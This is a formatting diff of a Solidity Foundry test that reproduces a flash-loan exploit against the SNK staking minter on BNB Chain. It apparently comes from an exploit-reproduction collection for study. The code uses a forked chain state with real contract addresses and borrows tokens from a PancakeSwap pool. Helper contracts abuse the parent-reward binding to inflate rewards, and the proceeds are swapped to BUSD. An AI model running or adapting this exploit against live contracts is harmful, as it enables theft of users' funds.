@@ -12,7 +12,6 @@ import "./interface.sol";
 // @Summary
 // parent `rewardPerToken`, but times all children's balance
 
-
 interface IPancakeRouter01 {
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
@@ -20,92 +19,125 @@ interface IPancakeRouter01 {
     function addLiquidity(
         address tokenA,
         address tokenB,
-        uint amountADesired,
-        uint amountBDesired,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 amountADesired,
+        uint256 amountBDesired,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
-    ) external returns (uint amountA, uint amountB, uint liquidity);
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
     function addLiquidityETH(
         address token,
-        uint amountTokenDesired,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+        uint256 deadline
+    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
     function removeLiquidity(
         address tokenA,
         address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
-    ) external returns (uint amountA, uint amountB);
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
     function removeLiquidityETH(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external returns (uint amountToken, uint amountETH);
+        uint256 deadline
+    ) external returns (uint256 amountToken, uint256 amountETH);
     function removeLiquidityWithPermit(
         address tokenA,
         address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline,
-        bool approveMax, uint8 v, bytes32 r, bytes32 s
-    ) external returns (uint amountA, uint amountB);
+        uint256 deadline,
+        bool approveMax,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external returns (uint256 amountA, uint256 amountB);
     function removeLiquidityETHWithPermit(
         address token,
-        uint liquidity,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline,
-        bool approveMax, uint8 v, bytes32 r, bytes32 s
-    ) external returns (uint amountToken, uint amountETH);
+        uint256 deadline,
+        bool approveMax,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external returns (uint256 amountToken, uint256 amountETH);
     function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
     function swapTokensForExactTokens(
-        uint amountOut,
-        uint amountInMax,
+        uint256 amountOut,
+        uint256 amountInMax,
         address[] calldata path,
         address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
-    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
-        external
-        payable
-        returns (uint[] memory amounts);
-    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
-        external
-        returns (uint[] memory amounts);
-    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
-        external
-        returns (uint[] memory amounts);
-    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
-        external
-        payable
-        returns (uint[] memory amounts);
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+    function swapExactETHForTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
+    function swapTokensForExactETH(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+    function swapExactTokensForETH(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+    function swapETHForExactTokens(
+        uint256 amountOut,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
 
-    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
-    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
-    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
-    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
+    function getAmountOut(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) external pure returns (uint256 amountOut);
+    function getAmountIn(
+        uint256 amountOut,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) external pure returns (uint256 amountIn);
+    function getAmountsOut(
+        uint256 amountIn,
+        address[] calldata path
+    ) external view returns (uint256[] memory amounts);
+    function getAmountsIn(
+        uint256 amountOut,
+        address[] calldata path
+    ) external view returns (uint256[] memory amounts);
 }
+
 interface ISNKMinter {
     function bindParent(address parent) external;
     function stake(uint256 amount) external;
@@ -123,22 +155,22 @@ contract SNKExp is Test, IPancakeCallee {
     address[] public parents;
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 27784455);
+        cheats.createSelectFork("bsc", 27_784_455);
         deal(address(SNKToken), address(this), 1000 ether);
-        for (uint i = 0; i < 10; ++ i) {
+        for (uint256 i = 0; i < 10; ++i) {
             HackerTemplate t1 = new HackerTemplate();
             SNKToken.transfer(address(t1), 100 ether);
             t1.stake();
             parents.push(address(t1));
         }
-        uint startTime = block.timestamp;
+        uint256 startTime = block.timestamp;
         vm.warp(startTime + 20 days);
         SNKToken.approve(address(router), type(uint256).max);
         SNKToken.approve(address(pool), type(uint256).max);
     }
 
     function testNormal() external {
-        for (uint i = 0; i < 10; ++ i) {
+        for (uint256 i = 0; i < 10; ++i) {
             HackerTemplate t = HackerTemplate(parents[i]);
             t.exit2();
         }
@@ -147,35 +179,26 @@ contract SNKExp is Test, IPancakeCallee {
         path[1] = (address(BUSD));
         emit log_named_decimal_uint("Normal SNK Amount should get", SNKToken.balanceOf(address(this)), 18);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SNKToken.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
         emit log_named_decimal_uint("Normal BUSD Amount should get", BUSD.balanceOf(address(this)), 18);
     }
 
     function testExp() external {
-        pool.swap(80000 ether, 0, address(this), bytes("0x123"));
-
+        pool.swap(80_000 ether, 0, address(this), bytes("0x123"));
 
         address[] memory path = new address[](2);
         path[0] = address(SNKToken);
         path[1] = (address(BUSD));
         emit log_named_decimal_uint("EXP SNK Amount get", SNKToken.balanceOf(address(this)), 18);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SNKToken.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
         emit log_named_decimal_uint("EXP BUSD Amount get", BUSD.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
-        for (uint i = 0; i < 10; ++ i) {
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        for (uint256 i = 0; i < 10; ++i) {
             HackerTemplate t1 = new HackerTemplate();
             HackerTemplate t = HackerTemplate(parents[i]);
             t1.bind(parents[i]);
@@ -184,12 +207,11 @@ contract SNKExp is Test, IPancakeCallee {
             t.exit2();
             t1.exit1();
         }
-        SNKToken.transfer(address(pool), 85000 ether);
+        SNKToken.transfer(address(pool), 85_000 ether);
     }
 }
 
 contract HackerTemplate {
-
     IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);
     ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);
     address public owner;
@@ -203,21 +225,21 @@ contract HackerTemplate {
         _;
     }
 
-    function stake() public onlyOwner{
+    function stake() public onlyOwner {
         SNKToken.approve(address(minter), SNKToken.balanceOf(address(this)));
         minter.stake(SNKToken.balanceOf(address(this)));
     }
 
-    function bind(address p) public onlyOwner{
+    function bind(address p) public onlyOwner {
         minter.bindParent(p);
     }
 
-    function exit1() public onlyOwner{
+    function exit1() public onlyOwner {
         minter.exit();
         SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
     }
 
-    function exit2() public onlyOwner{
+    function exit2() public onlyOwner {
         minter.getReward();
         minter.exit();
         SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));
